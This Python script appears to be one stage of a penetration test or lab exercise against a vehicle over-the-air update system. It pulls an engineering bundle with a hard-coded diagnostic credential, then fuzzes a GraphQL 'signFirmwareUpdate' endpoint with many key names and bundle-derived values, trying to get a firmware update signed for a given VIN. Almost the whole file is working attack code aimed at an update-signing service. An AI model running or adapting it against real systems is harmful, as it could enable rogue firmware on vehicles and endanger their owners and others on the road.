#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage L: try binding the sign request to a freshly issued bundle.

The engineering bundle is regenerated per request: its manifest `nonce` and its
client certificate change every time, while vcu-reference.bin stays fixed at
sha256 2f3692767f605ef72fb47e1a779f2dfaeca802b4df1e35d38f8bb66d53ce6ea7.
A per-request nonce is exactly what a "bind this update to this campaign"
design wants in the request, so feed every bundle-derived value into a wide set
of variable keys.
"""
import base64, hashlib, io, json, os, zipfile
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
TB = "http://10.225.139.3:8080"
TSP = "http://10.225.139.2:8080/graphql"
REF = '{"errors":[{"message":"update campaign validation failed"}]}'

s = requests.Session()
s.auth = ("diag", CRED)

# fresh bundle
r = s.get(TB + "/api/v1/ota/engineering-bundle", timeout=20)
z = zipfile.ZipFile(io.BytesIO(r.content))
man = json.loads(z.read("manifest.json"))
nonce = man["nonce"]
client = z.read("diagnostics/client.pem")
client_sha = hashlib.sha256(client).hexdigest()
vcu = z.read("vcu-reference.bin")
VCU_SHA = hashlib.sha256(vcu).hexdigest()
zip_sha = hashlib.sha256(r.content).hexdigest()
nonce_b64 = base64.b64encode(nonce.encode()).decode()
try:
    nonce_hex = base64.b64decode(nonce).hex()
except Exception:
    nonce_hex = ""

print("[*] fresh bundle:")
print("    nonce       =", nonce)
print("    nonce(b64d) =", nonce_hex)
print("    vcu sha256  =", VCU_SHA)
print("    client sha  =", client_sha[:32])
print("    zip sha     =", zip_sha[:32])

VALUES = [nonce, nonce_b64, nonce_hex, CRED, PKG, VCU_SHA, zip_sha, client_sha,
          VIN, CAMP, 2, 1024, "0x08040000", True]
KEYS = """
nonce bundleNonce otaNonce updateNonce requestNonce challenge
credential credentials firmwareCredential packageKey packageCredential
token authToken updateToken campaignToken bundleToken
bundleHash bundleSha256 bundleId bundle
firmwareSha256 vcuSha256 imageSha256 digest sha256 hash
clientCert clientCertificate certificate certFingerprint fingerprint
campaignId campaign rollback rollbackCounter
vin vehicleId firmware image vcuReference
signature sig
updateId assignmentId
""".split()


def gql(q, v):
    r = s.post(TSP, json={"query": q, "variables": v}, timeout=12)
    return r.status_code, r.text.strip()


def main():
    diff = []
    n = 0
    for k in KEYS:
        for val in VALUES:
            body = {"vin": VIN, k: val}
            st, txt = gql("signFirmwareUpdate", body)
            n += 1
            if txt != REF:
                diff.append({"k": k, "v": str(val)[:60], "status": st, "resp": txt[:400]})
                print("  !DIFF", k, "=", str(val)[:40], "->", txt[:220], flush=True)
    print(f"[*] {n} probes, {len(diff)} deviations")
    # also: ALL bundle values at once under generic keys
    combos = [
        {"vin": VIN, "nonce": nonce, "credential": CRED, "campaignId": CAMP,
         "rollback": 2, "firmwareSha256": VCU_SHA, "size": 1024, "address": "0x08040000"},
        {"vin": VIN, "packageKey": PKG, "firmwareCredential": CRED, "nonce": nonce,
         "campaignId": CAMP, "sha256": VCU_SHA},
        {"vin": VIN, "bundle": {"nonce": nonce, "credential": CRED, "campaignId": CAMP,
                                "rollback": 2, "sha256": VCU_SHA}},
        {"vin": VIN, "input": {"nonce": nonce, "credential": CRED, "campaignId": CAMP,
                               "rollback": 2, "firmwareSha256": VCU_SHA, "size": 1024,
                               "address": "0x08040000"}},
    ]
    for c in combos:
        st, txt = gql("signFirmwareUpdate", c)
        tag = "SAME" if txt == REF else "DIFF"
        print(f"  {tag} combo keys={sorted(c.keys())} -> {txt[:140]}")
    json.dump({"nonce": nonce, "vcu_sha": VCU_SHA, "client_sha": client_sha,
               "zip_sha": zip_sha, "deviations": diff},
              open(os.path.join(EV, "L_bundle_binding.json"), "w"), indent=1)


if __name__ == "__main__":
    main()
